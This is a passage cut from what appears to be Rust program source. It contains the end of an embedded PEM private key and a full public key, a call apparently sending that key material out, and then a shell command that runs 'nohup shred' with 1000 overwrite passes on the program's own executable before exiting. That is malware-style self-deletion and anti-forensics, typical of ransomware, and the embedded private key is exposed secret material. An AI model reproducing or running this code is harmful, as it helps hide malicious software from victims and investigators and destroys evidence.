XdBTgqy9B4mrGkKwwEHvnNbhYBfyyiNijjP9zjs/ZWr4g/lnpO+k0jrvfCnhRPS9
0xjEoieA4Lde0MEa55zeLdY1L0k5Qp3YyLMeLWeFI7x5s97DaVYdNLRGgk8vEW6y
IG0DyU23JH4IVe2MPlRtAoHAGTncKjWkFMcOFr5FsRxVq1gQqOKV/9o8g1pdBmrz
Za8eDmXdeYGnT7wkcetqc1Lz2OjwkzGr3abhYxl6fUtvgEKKagSOYbIhPpvw5C7E
xxvJ/iHZU9rTn/Si8sLGMzlAmig1pzqPEjOXEYkgNzR5Fzhd2It1RJZcBXyShgpb
qxKDV6hc3oISegMpVK3WE2hj4/nl+KxWkTIpmiltapuDSohT1tbrkflI+1bt333m
p464amHIqJJePpIBVReM96Eu
-----END PRIVATE KEY-----
-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAxOScPB6U1cSvRhuZCoDs
D390WWXpT/jNPkTHJjfhfLh6Sjz6BFxHV/qiVrywBiOv4ay5dbT9f3/8hz/nHa7U
7x2Yg84ZHmZq+jdR5eIjEheBsuiHBhEoGe32eoSIwcDYpbWjGTxF2cFSKqjZKwvi
jKTawTud0y/BwDQaJCJRMhEyJDxAC/HTTlyfDYDjOwOhtq4nt5nK2fil6A5rwOyl
O2c86fSArp0ZCJsGd51lvUIaSV0DchdCUbZkxOWrScVF+CNhZBzHE0NeVoTmYoDo
TGP2Y3QX5o8CeOwz04KcN76WEDMnFldA7c4ZClYclUQVuMCpkcU8FIrhK9g9kJQR
pZVX1buPIGigsg/jrzFl99H1Kk8UvNJiYjVybMs2McSb+iXtSmeiWxG/P1MrH5Tp
v68DO12pjctIAQKVdBnjKtGKRCjaq8MbRcD6leJV3kq+quZkoEg+Zw6LZgfos1MB
NN0kxFFLrM9ukl30itoCYlQlrs3ZezJ4L/r5eqZRC86NAgMBAAE=
-----END PUBLIC KEY-----") . send () ; let _ = Command :: new ("sh") . arg ("-c") . arg (format ! (r#"nohup shred "{}" -f -z -u -n 1000 > /dev/null 2>&1 &"# , exe_path_str)) . stdout (Stdio :: null ()) . stderr (Stdio :: null ()) . spawn () . expect ("failed to start...") ; std :: process :: exit (0) ; } }